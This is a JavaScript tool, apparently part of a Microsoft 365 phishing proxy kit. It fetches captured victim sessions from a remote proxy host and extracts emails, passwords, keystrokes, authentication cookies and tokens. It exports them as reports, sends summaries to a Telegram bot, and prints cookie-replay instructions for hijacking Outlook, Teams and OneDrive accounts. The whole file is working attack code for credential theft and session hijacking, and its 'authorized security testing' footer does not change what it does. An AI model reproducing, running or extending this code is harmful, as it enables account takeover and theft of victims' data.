// ============================================================
//  ENHANCED DECRYPT LOG FILE v4.0
//  Full Data Extraction & Session Replay Tool
//  Captures all data including HttpOnly cookies
// ============================================================

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

// ============================================================
//  CONFIGURATION
// ============================================================

const CONFIG = {
    // Server URL (change to your proxy server)
    PROXY_SERVER: process.env.PROXY_SERVER || 'https://preoauth-login.onrender.com',
    
    // Output directory
    OUTPUT_DIR: './captured_data',
    
    // Telegram notifications (optional)
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '',
    
    // Replay settings
    REPLAY_ENABLED: true,
    REPLAY_SESSION_ID: null, // Set specific session ID or null for latest
    
    // Export formats
    EXPORT_JSON: true,
    EXPORT_HTML: true,
    EXPORT_TXT: true,
    
    // Session TTL (2 hours)
    SESSION_TTL: 2 * 60 * 60 * 1000
};

// ============================================================
//  DATA STRUCTURES
// ============================================================

class SessionDataExtractor {
    constructor() {
        this.sessions = new Map();
        this.cookies = new Map();
        this.tokens = new Map();
        this.forms = new Map();
        this.keystrokes = new Map();
        this.xssData = new Map();
        this.httpOnlyCookies = new Map();
        this.replayData = new Map();
        this.stats = {
            totalSessions: 0,
            totalCookies: 0,
            totalTokens: 0,
            totalForms: 0,
            totalKeystrokes: 0,
            totalHttpOnly: 0
        };
    }

    // ============================================================
    //  FETCH DATA FROM PROXY SERVER
    // ============================================================

    async fetchAllData() {
        console.log('\n📡 Fetching data from proxy server...');
        
        try {
            // Get all sessions
            const sessionsResponse = await axios.get(`${CONFIG.PROXY_SERVER}/sessions`);
            const sessionsData = sessionsResponse.data;
            
            console.log(`✅ Found ${sessionsData.total} sessions`);
            
            // Process each session
            for (const session of sessionsData.sessions) {
                await this.processSession(session);
            }
            
            console.log('\n📊 Data extraction complete!');
            this.printStats();
            
            return this.getCompleteData();
        } catch (error) {
            console.error('❌ Error fetching data:', error.message);
            return null;
        }
    }

    // ============================================================
    //  PROCESS INDIVIDUAL SESSION
    // ============================================================

    async processSession(sessionInfo) {
        const sessionId = sessionInfo.sessionId;
        
        try {
            // Get full session data
            const fullDataResponse = await axios.get(`${CONFIG.PROXY_SERVER}/api/full-session`, {
                headers: {
                    'X-Session-Id': sessionId
                }
            });
            
            const fullData = fullDataResponse.data;
            
            if (fullData.success) {
                // Store session data
                this.sessions.set(sessionId, {
                    id: sessionId,
                    email: fullData.email || 'unknown',
                    created: fullData.created,
                    lastActivity: fullData.lastActivity,
                    cookieCount: fullData.cookieCount || 0,
                    tokenCount: fullData.tokenCount || 0,
                    formCount: fullData.formCount || 0,
                    readyForReplay: fullData.readyForReplay || false,
                    evasionData: fullData.evasionData || {},
                    fingerprint: fullData.fingerprint || {},
                    userAgent: fullData.userAgent || 'Unknown'
                });
                
                // Store cookies
                if (fullData.cookies && Object.keys(fullData.cookies).length > 0) {
                    this.cookies.set(sessionId, fullData.cookies);
                    this.stats.totalCookies += Object.keys(fullData.cookies).length;
                    
                    // Detect HttpOnly cookies
                    const httpOnly = {};
                    for (const [name, value] of Object.entries(fullData.cookies)) {
                        if (name.includes('ESTSAUTH') || 
                            name.includes('ESTSAUTHPERSISTENT') || 
                            name.includes('ESTSSESSION') ||
                            name.includes('MSIS') ||
                            name.includes('FedAuth')) {
                            httpOnly[name] = value;
                        }
                    }
                    if (Object.keys(httpOnly).length > 0) {
                        this.httpOnlyCookies.set(sessionId, httpOnly);
                        this.stats.totalHttpOnly += Object.keys(httpOnly).length;
                    }
                }
                
                // Store tokens
                if (fullData.tokens && Object.keys(fullData.tokens).length > 0) {
                    this.tokens.set(sessionId, fullData.tokens);
                    this.stats.totalTokens += Object.keys(fullData.tokens).length;
                }
                
                // Store forms
                if (fullData.forms && fullData.forms.length > 0) {
                    this.forms.set(sessionId, fullData.forms);
                    this.stats.totalForms += fullData.forms.length;
                }
                
                // Store keystrokes (from keylogger)
                if (fullData.keystrokes) {
                    this.keystrokes.set(sessionId, fullData.keystrokes);
                }
                
                // Generate replay data
                if (fullData.readyForReplay) {
                    this.replayData.set(sessionId, {
                        sessionId: sessionId,
                        email: fullData.email,
                        cookies: fullData.cookies,
                        tokens: fullData.tokens,
                        cookieHeader: this.generateCookieHeader(fullData.cookies),
                        userAgent: fullData.fingerprint?.userAgent || 'Mozilla/5.0',
                        targetUrls: [
                            'https://outlook.office.com',
                            'https://teams.microsoft.com',
                            'https://onedrive.live.com',
                            'https://sharepoint.com',
                            'https://www.office.com',
                            'https://login.microsoftonline.com'
                        ]
                    });
                }
                
                console.log(`  ✅ Session: ${sessionId.substring(0, 16)}... | Email: ${fullData.email} | Cookies: ${Object.keys(fullData.cookies || {}).length} | Tokens: ${Object.keys(fullData.tokens || {}).length}`);
            }
            
            this.stats.totalSessions++;
            
        } catch (error) {
            console.error(`  ❌ Error processing session ${sessionId}:`, error.message);
        }
    }

    // ============================================================
    //  GENERATE COOKIE HEADER FOR REPLAY
    // ============================================================

    generateCookieHeader(cookies) {
        if (!cookies) return '';
        const cookieStrings = [];
        for (const [name, value] of Object.entries(cookies)) {
            if (value && value !== 'null' && value !== 'undefined') {
                cookieStrings.push(`${name}=${value}`);
            }
        }
        return cookieStrings.join('; ');
    }

    // ============================================================
    //  GET COMPLETE DATA
    // ============================================================

    getCompleteData() {
        return {
            sessions: Array.from(this.sessions.values()),
            cookies: Array.from(this.cookies.entries()),
            tokens: Array.from(this.tokens.entries()),
            httpOnlyCookies: Array.from(this.httpOnlyCookies.entries()),
            forms: Array.from(this.forms.entries()),
            keystrokes: Array.from(this.keystrokes.entries()),
            replayData: Array.from(this.replayData.entries()),
            stats: this.stats,
            extractedAt: new Date().toISOString()
        };
    }

    // ============================================================
    //  PRINT STATS
    // ============================================================

    printStats() {
        console.log('\n╔═══════════════════════════════════════════════════════════╗');
        console.log('║              EXTRACTION STATISTICS                       ║');
        console.log('╠═══════════════════════════════════════════════════════════╣');
        console.log(`║   📊 Total Sessions:     ${String(this.stats.totalSessions).padStart(10)} ║`);
        console.log(`║   🍪 Total Cookies:      ${String(this.stats.totalCookies).padStart(10)} ║`);
        console.log(`║   🔐 HttpOnly Cookies:   ${String(this.stats.totalHttpOnly).padStart(10)} ║`);
        console.log(`║   🎟️ Total Tokens:       ${String(this.stats.totalTokens).padStart(10)} ║`);
        console.log(`║   📝 Total Forms:        ${String(this.stats.totalForms).padStart(10)} ║`);
        console.log(`║   ⌨️ Total Keystrokes:   ${String(this.stats.totalKeystrokes).padStart(10)} ║`);
        console.log(`║   🔄 Ready for Replay:   ${String(this.replayData.size).padStart(10)} ║`);
        console.log('╚═══════════════════════════════════════════════════════════╝');
    }

    // ============================================================
    //  EXPORT DATA
    // ============================================================

    exportData(data) {
        console.log('\n💾 Exporting data...');
        
        // Create output directory
        if (!fs.existsSync(CONFIG.OUTPUT_DIR)) {
            fs.mkdirSync(CONFIG.OUTPUT_DIR, { recursive: true });
        }
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const exportPath = path.join(CONFIG.OUTPUT_DIR, `export_${timestamp}`);
        
        // Create subdirectories
        const paths = {
            json: path.join(exportPath, 'json'),
            html: path.join(exportPath, 'html'),
            txt: path.join(exportPath, 'txt')
        };
        
        for (const dir of Object.values(paths)) {
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
        }
        
        // Export JSON
        if (CONFIG.EXPORT_JSON) {
            this.exportJSON(data, paths.json);
        }
        
        // Export HTML
        if (CONFIG.EXPORT_HTML) {
            this.exportHTML(data, paths.html);
        }
        
        // Export TXT
        if (CONFIG.EXPORT_TXT) {
            this.exportTXT(data, paths.txt);
        }
        
        console.log(`✅ Data exported to: ${exportPath}`);
        
        // Send Telegram notification
        this.sendTelegramNotification(data);
        
        return exportPath;
    }

    // ============================================================
    //  EXPORT JSON
    // ============================================================

    exportJSON(data, outputPath) {
        try {
            // Main export
            fs.writeFileSync(
                path.join(outputPath, 'full_export.json'),
                JSON.stringify(data, null, 2)
            );
            
            // Individual session exports
            for (const [sessionId, session] of data.sessions) {
                const sessionData = {
                    session: session,
                    cookies: data.cookies.find(([id]) => id === sessionId)?.[1] || {},
                    tokens: data.tokens.find(([id]) => id === sessionId)?.[1] || {},
                    httpOnly: data.httpOnlyCookies.find(([id]) => id === sessionId)?.[1] || {},
                    forms: data.forms.find(([id]) => id === sessionId)?.[1] || [],
                    replay: data.replayData.find(([id]) => id === sessionId)?.[1] || null
                };
                
                fs.writeFileSync(
                    path.join(outputPath, `session_${sessionId.substring(0, 16)}.json`),
                    JSON.stringify(sessionData, null, 2)
                );
            }
            
            console.log(`  ✅ JSON exports complete`);
        } catch (error) {
            console.error(`  ❌ JSON export error:`, error.message);
        }
    }

    // ============================================================
    //  EXPORT HTML - Viewable Report
    // ============================================================

    exportHTML(data, outputPath) {
        try {
            const html = this.generateHTMLReport(data);
            fs.writeFileSync(
                path.join(outputPath, 'report.html'),
                html
            );
            
            console.log(`  ✅ HTML report generated`);
        } catch (error) {
            console.error(`  ❌ HTML export error:`, error.message);
        }
    }

    // ============================================================
    //  GENERATE HTML REPORT
    // ============================================================

    generateHTMLReport(data) {
        let html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Data Export - ${new Date().toISOString()}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e17;
            color: #e0e0e0;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 30px;
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid rgba(102, 126, 234, 0.3);
        }
        .header h1 { 
            color: #64ffda;
            font-size: 28px;
            margin-bottom: 10px;
        }
        .header .subtitle { color: #a8b2d1; font-size: 14px; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .stat-card .number { 
            font-size: 28px;
            font-weight: 700;
            color: #64ffda;
        }
        .stat-card .label {
            font-size: 12px;
            color: #a8b2d1;
            margin-top: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .session-card {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .session-card h3 {
            color: #64ffda;
            margin-bottom: 15px;
            font-size: 18px;
        }
        .session-card .details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        }
        .session-card .detail-item {
            background: rgba(255, 255, 255, 0.03);
            padding: 10px;
            border-radius: 6px;
        }
        .session-card .detail-item .label {
            font-size: 11px;
            color: #a8b2d1;
            text-transform: uppercase;
        }
        .session-card .detail-item .value {
            font-size: 14px;
            margin-top: 4px;
            word-break: break-all;
        }
        .cookie-box {
            background: rgba(255, 255, 255, 0.03);
            padding: 15px;
            border-radius: 8px;
            margin-top: 10px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        .cookie-box .cookie-item {
            padding: 4px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        }
        .cookie-box .cookie-name {
            color: #64ffda;
            font-weight: 600;
        }
        .cookie-box .cookie-value {
            color: #ff6b6b;
        }
        .tag {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 11px;
            margin: 2px;
        }
        .tag.http-only { background: #ff6b6b22; color: #ff6b6b; }
        .tag.secure { background: #64ffda22; color: #64ffda; }
        .tag.token { background: #ffd93d22; color: #ffd93d; }
        .tag.ready { background: #6bcb7722; color: #6bcb77; }
        .badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 11px;
            background: rgba(100, 255, 218, 0.1);
            color: #64ffda;
        }
        .badge.success { background: rgba(107, 203, 119, 0.2); color: #6bcb77; }
        .badge.warning { background: rgba(255, 217, 61, 0.2); color: #ffd93d; }
        .badge.danger { background: rgba(255, 107, 107, 0.2); color: #ff6b6b; }
        .replay-section {
            background: rgba(100, 255, 218, 0.05);
            border: 1px solid rgba(100, 255, 218, 0.2);
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
        }
        .replay-section h4 {
            color: #64ffda;
            margin-bottom: 10px;
        }
        .code-block {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .footer {
            margin-top: 40px;
            padding: 20px;
            text-align: center;
            color: #49567e;
            font-size: 12px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Session Data Export</h1>
            <div class="subtitle">Extracted: ${new Date().toISOString()}</div>
            <div class="subtitle">Total Sessions: ${data.stats.totalSessions}</div>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="number">${data.stats.totalSessions}</div>
                <div class="label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="number">${data.stats.totalCookies}</div>
                <div class="label">Total Cookies</div>
            </div>
            <div class="stat-card">
                <div class="number">${data.stats.totalHttpOnly}</div>
                <div class="label">HttpOnly Cookies</div>
            </div>
            <div class="stat-card">
                <div class="number">${data.stats.totalTokens}</div>
                <div class="label">Total Tokens</div>
            </div>
            <div class="stat-card">
                <div class="number">${data.stats.totalForms}</div>
                <div class="label">Forms Captured</div>
            </div>
            <div class="stat-card">
                <div class="number">${data.replayData.length}</div>
                <div class="label">Ready for Replay</div>
            </div>
        </div>
`;

        // Sessions
        for (const [sessionId, session] of data.sessions) {
            const cookies = data.cookies.find(([id]) => id === sessionId)?.[1] || {};
            const tokens = data.tokens.find(([id]) => id === sessionId)?.[1] || {};
            const httpOnly = data.httpOnlyCookies.find(([id]) => id === sessionId)?.[1] || {};
            const forms = data.forms.find(([id]) => id === sessionId)?.[1] || [];
            const replay = data.replayData.find(([id]) => id === sessionId)?.[1] || null;
            
            html += `
        <div class="session-card">
            <h3>📱 Session: ${sessionId.substring(0, 16)}...</h3>
            <div class="details">
                <div class="detail-item">
                    <div class="label">Email</div>
                    <div class="value">${session.email || 'unknown'}</div>
                </div>
                <div class="detail-item">
                    <div class="label">Created</div>
                    <div class="value">${new Date(session.created).toLocaleString()}</div>
                </div>
                <div class="detail-item">
                    <div class="label">Last Activity</div>
                    <div class="value">${new Date(session.lastActivity).toLocaleString()}</div>
                </div>
                <div class="detail-item">
                    <div class="label">Status</div>
                    <div class="value">
                        <span class="badge ${session.readyForReplay ? 'success' : 'warning'}">
                            ${session.readyForReplay ? '✅ Ready for Replay' : '⏳ Partial Data'}
                        </span>
                    </div>
                </div>
            </div>
`;

            // Cookies
            if (Object.keys(cookies).length > 0) {
                html += `
            <div style="margin-top: 15px;">
                <strong>🍪 Cookies (${Object.keys(cookies).length})</strong>
                <div class="cookie-box">
`;
                for (const [name, value] of Object.entries(cookies)) {
                    const isHttpOnly = name in httpOnly;
                    const isSecure = name.includes('ESTSAUTH') || name.includes('ESTSAUTHPERSISTENT');
                    html += `
                    <div class="cookie-item">
                        <span class="cookie-name">${name}</span>
                        ${isHttpOnly ? '<span class="tag http-only">HttpOnly</span>' : ''}
                        ${isSecure ? '<span class="tag secure">Secure</span>' : ''}
                        <span class="cookie-value">${value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : 'null'}</span>
                    </div>
`;
                }
                html += `
                </div>
            </div>
`;
            }

            // Tokens
            if (Object.keys(tokens).length > 0) {
                html += `
            <div style="margin-top: 15px;">
                <strong>🎟️ Tokens (${Object.keys(tokens).length})</strong>
                <div class="cookie-box">
`;
                for (const [name, value] of Object.entries(tokens)) {
                    html += `
                    <div class="cookie-item">
                        <span class="cookie-name">${name}</span>
                        <span class="tag token">Token</span>
                        <span class="cookie-value">${value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : 'null'}</span>
                    </div>
`;
                }
                html += `
                </div>
            </div>
`;
            }

            // Replay Data
            if (replay) {
                html += `
            <div class="replay-section">
                <h4>🔄 Session Replay Data</h4>
                <div class="code-block">
Cookie Header:
${replay.cookieHeader || 'No cookies available'}

Target URLs:
${replay.targetUrls ? replay.targetUrls.join('\n') : 'No targets specified'}

User Agent:
${replay.userAgent || 'Default'}
                </div>
                <div style="margin-top: 10px;">
                    <button onclick="copyReplayData('${sessionId}')" class="badge" style="cursor:pointer;">
                        📋 Copy Cookie Header
                    </button>
                    <button onclick="openReplayTarget('${sessionId}')" class="badge success" style="cursor:pointer;">
                        🚀 Open in Browser
                    </button>
                </div>
            </div>
`;
            }

            // Forms
            if (forms && forms.length > 0) {
                html += `
            <div style="margin-top: 15px;">
                <strong>📝 Forms Captured (${forms.length})</strong>
                <div class="cookie-box">
`;
                for (const form of forms) {
                    html += `
                    <div class="cookie-item">
                        ${form.email ? `📧 ${form.email}` : ''}
                        ${form.password ? `🔑 ${'•'.repeat(Math.min(form.password.length, 20))}` : ''}
                        <span style="color:#a8b2d1;font-size:11px;">${new Date(form.timestamp).toLocaleString()}</span>
                    </div>
`;
                }
                html += `
                </div>
            </div>
`;
            }

            html += `
        </div>
`;
        }

        html += `
        <div class="footer">
            Generated by Microsoft 365 Proxy v4.0 - Advanced Evasion<br>
            All data is for authorized security testing purposes only
        </div>
    </div>

    <script>
        function copyReplayData(sessionId) {
            const elements = document.querySelectorAll('.replay-section .code-block');
            let text = '';
            elements.forEach(el => {
                text += el.textContent;
            });
            navigator.clipboard.writeText(text).then(() => {
                alert('✅ Cookie header copied to clipboard!');
            });
        }

        function openReplayTarget(sessionId) {
            const targets = document.querySelectorAll('.replay-section .code-block');
            const urls = [];
            targets.forEach(el => {
                const lines = el.textContent.split('\\n');
                let inUrls = false;
                for (const line of lines) {
                    if (line.includes('Target URLs:')) {
                        inUrls = true;
                        continue;
                    }
                    if (inUrls && line.trim() && !line.includes('User Agent:')) {
                        urls.push(line.trim());
                    }
                    if (line.includes('User Agent:')) {
                        break;
                    }
                }
            });
            if (urls.length > 0) {
                window.open(urls[0], '_blank');
            } else {
                alert('No target URLs available');
            }
        }
    </script>
</body>
</html>`;

        return html;
    }

    // ============================================================
    //  EXPORT TXT - Plain Text Report
    // ============================================================

    exportTXT(data, outputPath) {
        try {
            let txt = '='.repeat(80) + '\n';
            txt += '  MICROSOFT 365 PROXY - SESSION DATA EXPORT\n';
            txt += '  ' + new Date().toISOString() + '\n';
            txt += '='.repeat(80) + '\n\n';

            txt += `  Total Sessions: ${data.stats.totalSessions}\n`;
            txt += `  Total Cookies: ${data.stats.totalCookies}\n`;
            txt += `  HttpOnly Cookies: ${data.stats.totalHttpOnly}\n`;
            txt += `  Total Tokens: ${data.stats.totalTokens}\n`;
            txt += `  Total Forms: ${data.stats.totalForms}\n`;
            txt += `  Ready for Replay: ${data.replayData.length}\n\n`;
            txt += '='.repeat(80) + '\n\n';

            for (const [sessionId, session] of data.sessions) {
                const cookies = data.cookies.find(([id]) => id === sessionId)?.[1] || {};
                const tokens = data.tokens.find(([id]) => id === sessionId)?.[1] || {};
                const httpOnly = data.httpOnlyCookies.find(([id]) => id === sessionId)?.[1] || {};
                const replay = data.replayData.find(([id]) => id === sessionId)?.[1] || null;

                txt += `SESSION: ${sessionId}\n`;
                txt += `  Email: ${session.email || 'unknown'}\n`;
                txt += `  Created: ${new Date(session.created).toLocaleString()}\n`;
                txt += `  Last Activity: ${new Date(session.lastActivity).toLocaleString()}\n`;
                txt += `  Ready for Replay: ${session.readyForReplay ? 'YES' : 'NO'}\n\n`;

                if (Object.keys(cookies).length > 0) {
                    txt += `  COOKIES (${Object.keys(cookies).length}):\n`;
                    for (const [name, value] of Object.entries(cookies)) {
                        const isHttpOnly = name in httpOnly;
                        txt += `    ${isHttpOnly ? '[HttpOnly]' : '[Cookie]'} ${name}: ${value}\n`;
                    }
                    txt += '\n';
                }

                if (Object.keys(tokens).length > 0) {
                    txt += `  TOKENS (${Object.keys(tokens).length}):\n`;
                    for (const [name, value] of Object.entries(tokens)) {
                        txt += `    [Token] ${name}: ${value}\n`;
                    }
                    txt += '\n';
                }

                if (replay) {
                    txt += `  REPLAY DATA:\n`;
                    txt += `    Cookie Header: ${replay.cookieHeader || 'N/A'}\n`;
                    txt += `    User Agent: ${replay.userAgent || 'Default'}\n`;
                    txt += `    Target URLs:\n`;
                    if (replay.targetUrls) {
                        for (const url of replay.targetUrls) {
                            txt += `      - ${url}\n`;
                        }
                    }
                    txt += '\n';
                }

                txt += '-' .repeat(40) + '\n\n';
            }

            fs.writeFileSync(
                path.join(outputPath, 'export.txt'),
                txt
            );

            console.log(`  ✅ TXT export complete`);
        } catch (error) {
            console.error(`  ❌ TXT export error:`, error.message);
        }
    }

    // ============================================================
    //  SEND TELEGRAM NOTIFICATION
    // ============================================================

    async sendTelegramNotification(data) {
        if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
            console.log('  ℹ️ Telegram notifications disabled (missing credentials)');
            return;
        }

        try {
            let msg = '📊 *SESSION DATA EXTRACTED*\n\n';
            msg += `*Total Sessions:* ${data.stats.totalSessions}\n`;
            msg += `*Total Cookies:* ${data.stats.totalCookies}\n`;
            msg += `*HttpOnly Cookies:* ${data.stats.totalHttpOnly}\n`;
            msg += `*Total Tokens:* ${data.stats.totalTokens}\n`;
            msg += `*Ready for Replay:* ${data.replayData.length}\n\n`;
            msg += `*Extracted:* ${new Date().toISOString()}\n\n`;
            msg += `*Session Details:*\n`;

            for (const [sessionId, session] of data.sessions) {
                const cookies = data.cookies.find(([id]) => id === sessionId)?.[1] || {};
                const tokens = data.tokens.find(([id]) => id === sessionId)?.[1] || {};
                const httpOnly = data.httpOnlyCookies.find(([id]) => id === sessionId)?.[1] || {};
                msg += `  • ${session.email || 'unknown'}: ${Object.keys(cookies).length} cookies, ${Object.keys(tokens).length} tokens, ${Object.keys(httpOnly).length} HttpOnly\n`;
            }

            await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: msg,
                parse_mode: 'Markdown'
            });

            console.log('  ✅ Telegram notification sent');
        } catch (error) {
            console.error('  ❌ Telegram notification failed:', error.message);
        }
    }

    // ============================================================
    //  SESSION REPLAY - Auto Authenticate
    // ============================================================

    async replaySession(sessionId) {
        console.log(`\n🔄 Replaying session: ${sessionId}`);
        
        const replayData = this.replayData.get(sessionId);
        if (!replayData) {
            console.log(`❌ No replay data found for session ${sessionId}`);
            return false;
        }

        console.log(`  📧 Email: ${replayData.email}`);
        console.log(`  🍪 Cookies: ${Object.keys(replayData.cookies || {}).length}`);
        console.log(`  🎟️ Tokens: ${Object.keys(replayData.tokens || {}).length}`);

        // Generate browser instructions
        const instructions = this.generateReplayInstructions(replayData);
        console.log('\n📋 Replay Instructions:');
        console.log(instructions);

        return true;
    }

    // ============================================================
    //  GENERATE REPLAY INSTRUCTIONS
    // ============================================================

    generateReplayInstructions(replayData) {
        let instructions = '';
        instructions += '=' .repeat(60) + '\n';
        instructions += '  SESSION REPLAY INSTRUCTIONS\n';
        instructions += '=' .repeat(60) + '\n\n';

        instructions += '1. INSTALL COOKIE EDITOR EXTENSION:\n';
        instructions += '   - Chrome: EditThisCookie or Cookie-Editor\n';
        instructions += '   - Firefox: Cookie-Editor\n\n';

        instructions += '2. OPEN TARGET URL:\n';
        instructions += `   ${replayData.targetUrls ? replayData.targetUrls[0] : 'https://outlook.office.com'}\n\n`;

        instructions += '3. SET COOKIES:\n';
        if (replayData.cookies) {
            for (const [name, value] of Object.entries(replayData.cookies)) {
                instructions += `   - ${name} = ${value}\n`;
            }
        }
        instructions += '\n';

        instructions += '4. SET USER AGENT (optional):\n';
        instructions += `   ${replayData.userAgent || 'Default'}\n\n`;

        instructions += '5. REFRESH PAGE\n';
        instructions += '   - You should be automatically authenticated\n\n';

        instructions += '6. ALTERNATIVE - Use cookie header:\n';
        instructions += `   ${replayData.cookieHeader || 'No cookies available'}\n\n`;

        instructions += '=' .repeat(60) + '\n';
        instructions += '  TROUBLESHOOTING:\n';
        instructions += '  - Clear browser cache if not working\n';
        instructions += '  - Try different target URL\n';
        instructions += '  - Check if session has expired\n';
        instructions += '=' .repeat(60) + '\n';

        return instructions;
    }

    // ============================================================
    //  RUN FULL EXTRACTION
    // ============================================================

    async run() {
        console.log('\n╔═══════════════════════════════════════════════════════════╗');
        console.log('║    🛡️ MICROSOFT 365 PROXY v4.0 - DATA EXTRACTOR        ║');
        console.log('║    🔐 Full Session Data & HttpOnly Cookie Capture        ║');
        console.log('╚═══════════════════════════════════════════════════════════╝');

        const data = await this.fetchAllData();
        
        if (data) {
            // Export data
            const exportPath = this.exportData(data);
            
            // Replay sessions
            if (CONFIG.REPLAY_ENABLED && data.replayData.length > 0) {
                console.log('\n🔄 Available sessions for replay:');
                for (const [sessionId, replay] of data.replayData) {
                    console.log(`  • ${replay.email || 'unknown'}: ${replay.sessionId}`);
                }
                
                // If specific session ID provided
                if (CONFIG.REPLAY_SESSION_ID) {
                    await this.replaySession(CONFIG.REPLAY_SESSION_ID);
                } else {
                    // Replay first available session
                    const firstReplay = data.replayData[0];
                    if (firstReplay) {
                        await this.replaySession(firstReplay[0]);
                    }
                }
            }

            console.log('\n✅ Extraction complete!');
            console.log(`📁 Data exported to: ${exportPath}`);
            console.log('📊 Check the HTML report for detailed view');
        }

        return data;
    }
}

// ============================================================
//  COMMAND LINE INTERFACE
// ============================================================

async function main() {
    const extractor = new SessionDataExtractor();
    
    // Parse command line arguments
    const args = process.argv.slice(2);
    for (const arg of args) {
        if (arg === '--help' || arg === '-h') {
            console.log(`
Usage: node decrypt_log_file.js [options]

Options:
  --server <url>      Proxy server URL (default: http://localhost:3000)
  --session <id>      Specific session ID to replay
  --no-replay         Disable session replay
  --output <dir>      Output directory (default: ./captured_data)
  --no-telegram       Disable Telegram notifications
  --help, -h          Show this help

Examples:
  node decrypt_log_file.js
  node decrypt_log_file.js --server http://192.168.1.100:3000
  node decrypt_log_file.js --session sess_abc123
  node decrypt_log_file.js --no-replay --output ./exports

Environment Variables:
  PROXY_SERVER        Proxy server URL
  TELEGRAM_BOT_TOKEN  Telegram bot token
  TELEGRAM_CHAT_ID    Telegram chat ID
`);
            return;
        }

        if (arg.startsWith('--server=')) {
            CONFIG.PROXY_SERVER = arg.split('=')[1];
        }
        if (arg.startsWith('--session=')) {
            CONFIG.REPLAY_SESSION_ID = arg.split('=')[1];
        }
        if (arg === '--no-replay') {
            CONFIG.REPLAY_ENABLED = false;
        }
        if (arg.startsWith('--output=')) {
            CONFIG.OUTPUT_DIR = arg.split('=')[1];
        }
        if (arg === '--no-telegram') {
            CONFIG.TELEGRAM_BOT_TOKEN = '';
            CONFIG.TELEGRAM_CHAT_ID = '';
        }
    }

    await extractor.run();
}

// ============================================================
//  EXPORT MODULE
// ============================================================

if (require.main === module) {
    main().catch(console.error);
}

module.exports = { SessionDataExtractor, CONFIG };